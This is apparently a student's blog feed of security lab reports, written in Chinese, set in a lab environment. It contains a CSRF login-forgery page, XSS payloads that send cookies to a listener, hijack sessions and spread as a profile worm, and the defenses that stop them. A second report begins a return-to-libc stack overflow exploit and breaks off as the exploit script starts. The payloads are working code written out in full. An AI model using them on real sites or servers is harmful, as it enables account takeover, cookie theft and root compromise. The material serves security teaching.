class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, here is a CSRF_Login attack!  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 发送 POST 请求  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 带上 cookie  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/login&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">       <span class="comment">// 传递参数  </span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">username</span>:<span class="string">&quot;samy&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">password</span>:<span class="string">&quot;seedsamy&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persistent</span>:<span class="literal">true</span>,    </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>Samy 向 Alice 发送了一封邮件，诱使 Alice 点击恶意链接http://www.csrflabattacker.com/login_csrf.html</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620222327448.png"alt="image-20240620222327448" /><figcaption aria-hidden="true">image-20240620222327448</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223041289.png"alt="image-20240620223041289" /><figcaption aria-hidden="true">image-20240620223041289</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223149485.png"alt="image-20240620223149485" /><figcaption aria-hidden="true">image-20240620223149485</figcaption></figure><h3 id="任务-4防御策略"><strong>任务 4：防御策略</strong></h3><p>首先进入目录/var/www/CSRF/Elgg/vendor/elgg/elgg/engine/classes/Elgg，找到ActionService.php 文件中的 gatekeeper() 函数，并注释掉 return true语句。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620231737340.png"alt="image-20240620231737340" /><figcaption aria-hidden="true">image-20240620231737340</figcaption></figure><p>所有 3 次攻击均失败：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232609700.png"alt="image-20240620232609700" /><figcaption aria-hidden="true">image-20240620232609700</figcaption></figure><p>GET 请求没有 token：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232620176.png"alt="image-20240620232620176" /><figcaption aria-hidden="true">image-20240620232620176</figcaption></figure><p>POST 请求没有 token：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232830171.png"alt="image-20240620232830171" /><figcaption aria-hidden="true">image-20240620232830171</figcaption></figure><p>登录没有 token：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232359807.png"alt="image-20240620232359807" /><figcaption aria-hidden="true">image-20240620232359807</figcaption></figure><h2id="跨站脚本xss攻击实验"><strong>跨站脚本（XSS）攻击实验</strong></h2><p>首先需要切换网站，切换到 http://www.xsslabelgg.com。</p><h3 id="任务-1从受害者机器窃取-cookie"><strong>任务 1：从受害者机器窃取Cookie</strong></h3><p>使用 samy 登录，修改 samy 的个人资料。在“关于我”字段中，首先点击编辑HTML，添加以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=http://127.0.0.1:5555?c=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) +  <span class="string">&#x27;&gt;&#x27;</span>); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102354596.png"alt="image-20240621102354596" /><figcaption aria-hidden="true">image-20240621102354596</figcaption></figure><p>切换到 Alice 并查看 Samy 的主页，使用 nc 监听 5555 端口<code>nc -l 5555 -v</code> 来查看数据包信息，HTTP Header Live也有效。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102835358.png"alt="image-20240621102835358" /><figcaption aria-hidden="true">image-20240621102835358</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621103053599.png"alt="image-20240621103053599" /><figcaption aria-hidden="true">image-20240621103053599</figcaption></figure><h3 id="任务-2使用-ajax-脚本自动发起会话劫持"><strong>任务 2：使用 Ajax脚本自动发起会话劫持</strong></h3><p>使用 samy 登录，修改 samy 的个人资料。在“关于我”字段中，首先点击编辑HTML，添加以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>然后，切换到使用 Alice 登录，从 Alice 的界面打开 Samy的主页进行查看。通过 HTTP Header Live 插件，发现已发送修改简要描述的POST 请求，达成攻击效果。发送的 HTTP 数据包：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621104726870.png"alt="image-20240621104726870" /><figcaption aria-hidden="true">image-20240621104726870</figcaption></figure><h3 id="任务-3构造-xss-蠕虫"><strong>任务 3：构造 XSS 蠕虫</strong></h3><p>使用 samy 登录，修改 samy 的个人资料。在“关于我”字段中，首先点击编辑HTML，添加以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&#x27;worm&#x27;</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">description</span>: <span class="string">&quot;&lt;script id=&#x27;worm&#x27;&gt;&quot;</span> + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;worm&#x27;</span>).<span class="property">innerHTML</span> + <span class="string">&quot;&lt;\/script&gt;&quot;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">3000</span>)  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>然后，切换到使用 Alice 登录，从 Alice 的界面打开 Samy的主页进行查看。通过 HTTP Header Live 插件，发现已发送修改简要描述的POST 请求，达成攻击效果。发送的 HTTP 数据包：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621105412187.png"alt="image-20240621105412187" /><figcaption aria-hidden="true">image-20240621105412187</figcaption></figure><p>与上述不同的是，此 POST 数据包的描述字段被修改为恶意 XSS脚本本身，从而创造了传播性。修改 Alice个人资料的具体数据包内容如下。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621110705476.png"alt="image-20240621110705476" /><figcaption aria-hidden="true">image-20240621110705476</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">http://www.xsslabelgg.com/action/profile/edit</span><br><span class="line">Host: www.xsslabelgg.com</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://www.xsslabelgg.com/profile/samy</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">origin: http://www.xsslabelgg.com</span><br><span class="line">Content-Length: 1136</span><br><span class="line">Cookie: Elgg=jl5l97kq1k4todunjgn0ek8ft0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">__elgg_ts=1718938378&amp;__elgg_token=P-0B7cbe_msL5vOGF0n8AQ&amp;guid=44&amp;briefdescription=Samy is my hero&amp;description=&lt;script id=&#x27;worm&#x27;&gt;  </span><br><span class="line">    setTimeout(() =&gt; &#123;  </span><br><span class="line">        var ts = elgg.security.token.__elgg_ts;  </span><br><span class="line">        var token = elgg.security.token.__elgg_token;  </span><br><span class="line">        var guid = elgg.session.user.guid;  </span><br><span class="line">        fetch(&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;, &#123;  </span><br><span class="line">            credentials: &#x27;include&#x27;,  </span><br><span class="line">            method: &#x27;POST&#x27;,  </span><br><span class="line">            headers: &#123;  </span><br><span class="line">                &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            body: new URLSearchParams(&#123;  </span><br><span class="line">                __elgg_ts: ts,  </span><br><span class="line">                __elgg_token: token,  </span><br><span class="line">                guid: guid,  </span><br><span class="line">                briefdescription: &quot;Samy is my hero&quot;,  </span><br><span class="line">                description: &quot;&lt;script id=&#x27;worm&#x27;&gt;&quot; + document.getElementById(&#x27;worm&#x27;).innerHTML + &quot;&lt;\/script&gt;&quot;  </span><br><span class="line">            &#125;)  </span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;, 3000)  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">POST: HTTP/1.1 302 Found</span><br><span class="line">Date: Fri, 21 Jun 2024 02:53:01 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Location: http://www.xsslabelgg.com/profile/alice</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout=5, max=97</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br></pre></td></tr></table></figure><p>以 Boby 登录并访问 Alice 的个人资料，也可以获取修改个人资料的 POST数据包，Boby 的介绍也被修改为同一句话：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111233972.png"alt="image-20240621111233972" /><figcaption aria-hidden="true">image-20240621111233972</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111431159.png"alt="image-20240621111431159" /><figcaption aria-hidden="true">image-20240621111431159</figcaption></figure><h3 id="任务-4防御策略-1"><strong>任务 4：防御策略</strong></h3><h4 id="仅启用-htmlawed-1.9">仅启用 HTMLawed 1.9</h4>Elgg 默认有防御策略。虚拟机已禁用并注释掉相应的防御策略。实际上，ElggWeb 应用程序最初启用了一个自定义安全插件HTMLawed，它验证用户输入并移除输入中的标签。这个特定插件被注册到elgg/engine/lib/input.php 文件中的过滤标签功能。例如，它将<script>标签转换为<p><p>，以便 JavaScript 脚本无法执行。</p><p>进入账户→管理（顶部菜单）→插件（右侧面板），然后从下拉菜单中选择安全和垃圾邮件，点击过滤。找到下面的HTMLawed 1.8 插件。点击激活以启用策略。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120050952.png"alt="image-20240621120050952" /><figcaption aria-hidden="true">image-20240621120050952</figcaption></figure><p>再次访问 Samy 的主页并尝试修改，发现 script 标签被转换为 p标签，插入的 js 语句格式被转换，无法执行。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120305885.png"alt="image-20240621120305885" /><figcaption aria-hidden="true">image-20240621120305885</figcaption></figure><h4 id="启用-htmlawed-1.9-和-htmlspecialchars">启用 HTMLawed 1.9 和htmlspecialchars</h4><p><code>htmlspecialchars</code> 函数将以下特殊字符转换为相应的 HTML实体：</p><ul><li><code>&amp;</code> 转换为 &amp;amp;</li><li><code>&lt;</code> 转换为 &amp;lt;</li><li><code>&gt;</code> 转换为 &amp;gt;</li><li><code>"</code> 转换为 &amp;quot;</li><li><code>'</code> 转换为 &amp;#039;</li></ul><p>我们以超级用户身份进入目录<code>/var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</code>，使用vim 进入调用 <code>htmlspecialchars()</code>函数的文件：text.php、url.php、dropdown.php、email.php。在每个文件中，取消注释相应的<code>htmlspecialchars()</code> 函数调用。使用的命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo su </span><br><span class="line">cd /var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</span><br><span class="line">vim text.php </span><br><span class="line">vim url.php </span><br><span class="line">vim dropdown.php </span><br><span class="line">vim email.php </span><br></pre></td></tr></table></figure><p>text.php:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121244426.png"alt="image-20240621121244426" /><figcaption aria-hidden="true">image-20240621121244426</figcaption></figure><p>url.php</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121416527.png"alt="image-20240621121416527" /><figcaption aria-hidden="true">image-20240621121416527</figcaption></figure><p>dropdown.php</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121450425.png"alt="image-20240621121450425" /><figcaption aria-hidden="true">image-20240621121450425</figcaption></figure><p>email.php</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121538048.png"alt="image-20240621121538048" /><figcaption aria-hidden="true">image-20240621121538048</figcaption></figure><p>访问 Samy 的主页，发现一些特殊符号已被转换为实体符号，js语句无法执行：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621123332775.png"alt="image-20240621123332775" /><figcaption aria-hidden="true">image-20240621123332775</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> HUST 实验报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Information System Security Lab2-System Security</title>
      <link href="/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/"/>
      <url>/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/</url>
      
        <content type="html"><![CDATA[<h1 id="信息系统安全实验记录">信息系统安全实验记录</h1><h2id="利用web服务器的漏洞进程获取shell或删除根权限文件tmptest">利用Web服务器的漏洞进程获取Shell（或删除根权限文件/tmp/test）</h2><h3 id="实验环境配置">实验环境配置</h3><p>首先，需要配置实验环境。具体来说，需要禁用ASLR，然后编译目标程序，设置touchstone的权限并启动服务器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">sudo make</span><br><span class="line">sudo chown root touchstone</span><br><span class="line">sudo chmod +s touchstone</span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619105024424.png"alt="服务器启动后的进程信息" /><figcaption aria-hidden="true">服务器启动后的进程信息</figcaption></figure><p>然后使用浏览器输入127.0.0.1:80访问服务器界面，输入用户名：lixiang和密码：123456进行注册。</p><h3 id="执行攻击">执行攻击</h3><p>首先，使用ldd查看libc.so.6加载的基地址信息为<strong><code>0xf7d9d000</code></strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd banksv</span><br></pre></td></tr></table></figure><figure><imgsrc="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20240619110810753.png"alt="image-20240619110810753" /><figcaption aria-hidden="true">image-20240619110810753</figcaption></figure><p>使用ropper查看”/bin/bash”字符串相对于基地址的偏移地址为<strong><code>0x0018e363</code></strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619110952993.png"alt="image-20240619110952993" /><figcaption aria-hidden="true">image-20240619110952993</figcaption></figure><p>使用readelf查看system、exit、unlink函数的地址分别为<code>0x00041780</code>、<code>0x000340c0</code>、<code>0x0004f4100</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; exit&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; unlink&quot; </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619112513036.png"alt="image-20240619112513036" /><figcaption aria-hidden="true">image-20240619112513036</figcaption></figure><p>然后根据服务器日志，我们可以看到ebp地址为<code>0xffffd218</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619112956513.png"alt="image-20240619112956513" /><figcaption aria-hidden="true">image-20240619112956513</figcaption></figure><p>需要定位漏洞点getToken函数。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619123342290.png"alt="image-20240619123342290" /><figcaption aria-hidden="true">image-20240619123342290</figcaption></figure><p>该函数使用了固定大小的字符数组<code>s[1024]</code>，但没有检查<code>i</code>是否超出数组边界。当读取的字符数超过1024时，会发生缓冲区溢出，这是一个栈溢出，然后可以通过覆盖返回地址来实施攻击。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    s[i++] = c;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改exploit-template.py脚本，将地址替换为上述地址。type1用于获取shell，type2用于删除文件。但首先需要了解漏洞是什么。</p><p>为了找到溢出位置，我们必须找到存储返回地址的位置在getToken()栈帧与缓冲区s之间的距离。由于缓冲区变量s的长度为1024，因此该长度必须大于1024。使用以下代码进行探测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req += b&#x27;A&#x27; * 1024 + cyclic(200)</span><br></pre></td></tr></table></figure><p>使用python3运行以获取以下输出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit1.py 2 </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619124023743.png"alt="image-20240619124023743" /><figcaption aria-hidden="true">image-20240619124023743</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dmesg</span><br></pre></td></tr></table></figure><figure><imgsrc="https://pic1.zhimg.com/80/v2-411d49bcdf3fe49ec2980dce39fe9808_720w.png"alt="image-20240619124114951" /><figcaption aria-hidden="true">image-20240619124114951</figcaption></figure><p>这是内核输出日志。我们可以看到返回地址被覆盖为0x6161616c，实际上对应于”laaa”，然后计算偏移量为44，因此1024+ 44 = 1068可以覆盖返回地址。</p><ul><li><p>获取shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 1</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125150850.png"alt="image-20240619125150850" /><figcaption aria-hidden="true">image-20240619125150850</figcaption></figure><p>结果如上所示，地址依次为system函数、exit函数、“/bin/sh”地址，符合我们想要构造的栈结构。</p></li><li><p>删除文件</p><p>接下来，测试删除/tmp/test.txt。首先创建/tmp/test.txt并将其所有者更改为root。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt</span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125710551.png"alt="image-20240619125710551" /><figcaption aria-hidden="true">image-20240619125710551</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125937003.png"alt="image-20240619125937003" /><figcaption aria-hidden="true">image-20240619125937003</figcaption></figure></li></ul><p>攻击的Python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 